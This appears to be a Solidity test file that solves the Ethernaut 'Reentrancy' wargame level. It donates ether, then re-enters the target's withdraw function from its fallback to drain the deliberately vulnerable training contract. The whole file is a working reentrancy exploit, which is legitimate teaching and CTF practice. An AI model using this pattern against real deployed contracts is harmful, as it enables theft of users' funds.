// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

import "./base/EthernautTest.sol";

// Set actual level contract file
import "../../src/10_Reentrancy.sol";

contract LevelTest is EthernautTest {

    function setUp() public {
        // Set actual level factory address
        levelSetUp(LEVEL_10_REENTRANCY_ADDRESS, 0.001 ether);

        // Additional setup
    }

    function testAttack() public validateInstance {
        Reentrance reentrancy = Reentrance(levelInstance);
        
        reentrancy.donate{value: 0.0001 ether}(address(this));
        reentrancy.withdraw(0.0001 ether);
    }
    
    fallback() payable override external {
        Reentrance(levelInstance).withdraw(0.0001 ether);
    }
}